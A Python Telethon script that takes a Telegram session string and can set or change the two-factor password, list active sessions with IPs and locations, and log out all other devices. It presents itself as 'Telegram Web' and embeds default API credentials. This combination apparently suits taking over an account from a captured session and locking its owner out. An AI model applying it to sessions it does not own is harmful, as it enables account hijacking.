#!/usr/bin/env python3
"""
Python-based Telegram operations using Telethon
More reliable than gramJS for password operations
"""

import asyncio
import sys
import json
import os
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    PhoneCodeInvalidError
)

# Load from environment or use defaults
API_ID = int(os.getenv('API_ID', '23404078'))
API_HASH = os.getenv('API_HASH', '6f05053d7edb7a3aa89049bd934922d1')


async def set_password(session_string: str, new_password: str, current_password: str = None):
    """
    Set or change 2FA password
    Returns: {success: bool, error: str}
    """
    try:
        from telethon import functions
        from telethon.password import compute_check
        
        client = TelegramClient(
            StringSession(session_string),
            API_ID,
            API_HASH,
            device_model='Telegram Web',
            system_version='1.0',
            app_version='10.9.3'
        )
        
        await client.connect()
        
        # Get password info
        password_info = await client(functions.account.GetPasswordRequest())
        has_password = password_info.has_password
        
        if has_password and not current_password:
            await client.disconnect()
            return {
                'success': False,
                'error': 'Account has password but current password not provided',
                'has_password': True
            }
        
        # Prepare password check
        if has_password:
            # Verify current password first
            pwd_check = await compute_check(password_info, current_password)
        else:
            pwd_check = None
        
        # Update to new password using edit_2fa
        try:
            await client.edit_2fa(
                current_password=current_password if has_password else None,
                new_password=new_password,
                hint='Master Password',
                email=''
            )
            
            await client.disconnect()
            
            return {
                'success': True,
                'password_changed': has_password,
                'has_password': has_password
            }
        except Exception as edit_error:
            await client.disconnect()
            return {
                'success': False,
                'error': f'Failed to set password: {str(edit_error)}',
                'has_password': has_password
            }
        
    except PasswordHashInvalidError as e:
        return {
            'success': False,
            'error': f'Invalid current password: {str(e)}'
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }


async def get_sessions(session_string: str):
    """
    Get all active sessions/devices
    Returns: {success: bool, sessions: list, error: str}
    """
    try:
        from telethon import functions
        
        client = TelegramClient(
            StringSession(session_string),
            API_ID,
            API_HASH,
            device_model='Telegram Web',
            system_version='1.0',
            app_version='10.9.3'
        )
        
        await client.connect()
        
        result = await client(functions.account.GetAuthorizationsRequest())
        
        sessions = []
        for auth in result.authorizations:
            sessions.append({
                'hash': str(auth.hash),
                'device_model': auth.device_model or 'Unknown',
                'platform': auth.platform or 'Unknown',
                'system_version': auth.system_version or '',
                'app_name': auth.app_name or 'Telegram',
                'app_version': auth.app_version or '',
                'date_created': auth.date_created.isoformat() if auth.date_created else None,
                'date_active': auth.date_active.isoformat() if auth.date_active else None,
                'ip': auth.ip or '',
                'country': auth.country or '',
                'region': auth.region or '',
                'current': auth.current or False
            })
        
        await client.disconnect()
        
        return {
            'success': True,
            'sessions': sessions,
            'count': len(sessions)
        }
        
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'sessions': []
        }


async def logout_other_devices(session_string: str):
    """
    Logout all other devices except current session
    Returns: {success: bool, logged_out_count: int, error: str}
    """
    try:
        from telethon import functions
        
        client = TelegramClient(
            StringSession(session_string),
            API_ID,
            API_HASH,
            device_model='Telegram Web',
            system_version='1.0',
            app_version='10.9.3'
        )
        
        await client.connect()
        
        # Get sessions before
        before_result = await client(functions.account.GetAuthorizationsRequest())
        other_sessions_before = [a for a in before_result.authorizations if not a.current]
        count_before = len(other_sessions_before)
        
        if count_before == 0:
            await client.disconnect()
            return {
                'success': True,
                'logged_out_count': 0,
                'message': 'No other sessions to logout'
            }
        
        # Reset each other authorization individually
        errors = []
        for auth in other_sessions_before:
            try:
                await client(functions.account.ResetAuthorizationRequest(
                    hash=auth.hash
                ))
            except Exception as e:
                errors.append(f"Auth {auth.hash}: {str(e)}")
        
        # Verify after
        after_result = await client(functions.account.GetAuthorizationsRequest())
        other_sessions_after = [a for a in after_result.authorizations if not a.current]
        count_after = len(other_sessions_after)
        
        await client.disconnect()
        
        logged_out = count_before - count_after
        
        result = {
            'success': True,
            'logged_out_count': logged_out,
            'sessions_before': count_before,
            'sessions_after': count_after
        }
        
        if errors:
            result['errors'] = errors
        
        return result
        
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'logged_out_count': 0
        }


def main():
    """Main CLI interface"""
    if len(sys.argv) < 3:
        print(json.dumps({
            'error': 'Usage: telegram_operations.py <operation> <session_string> [args...]'
        }))
        sys.exit(1)
    
    operation = sys.argv[1]
    session_string = sys.argv[2]
    
    if operation == 'set_password':
        new_password = sys.argv[3] if len(sys.argv) > 3 else None
        current_password = sys.argv[4] if len(sys.argv) > 4 else None
        
        result = asyncio.run(set_password(session_string, new_password, current_password))
        print(json.dumps(result))
        
    elif operation == 'get_sessions':
        result = asyncio.run(get_sessions(session_string))
        print(json.dumps(result))
        
    elif operation == 'logout_devices':
        result = asyncio.run(logout_other_devices(session_string))
        print(json.dumps(result))
        
    else:
        print(json.dumps({
            'error': f'Unknown operation: {operation}'
        }))
        sys.exit(1)


if __name__ == '__main__':
    main()
